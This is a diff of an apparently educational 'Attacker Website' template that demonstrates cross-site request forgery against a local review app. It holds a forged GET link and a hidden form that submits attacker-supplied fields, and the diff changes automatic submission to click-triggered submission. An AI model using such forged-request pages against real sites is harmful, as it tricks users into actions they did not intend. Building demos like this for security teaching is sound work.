@@ -7,9 +7,11 @@
   <body>
     <h1>The Attacker Website</h1>
 
+    <% if (mode.toLowerCase() == 'get') {%>
     <section>
       <a href="http://localhost:3000/reviews?newReview=This+comment+is+not+yours%21">Visit this website!</a>
     </section>
+    <% } %>
     
     <% if (mode.toLowerCase() == 'post') {%>
     <section>
@@ -17,9 +19,7 @@
           <input type="hidden" name="username" value="The Attacker">
           <input type="hidden" name="email" value="theattacker@attacker.com">
       </form>
-      <script>
-        document.forms[0].submit();
-      </script>
+      <a href="#" onclick="document.forms[0].submit()">Visit this website!</a>
     </section>
     <% } %>
 
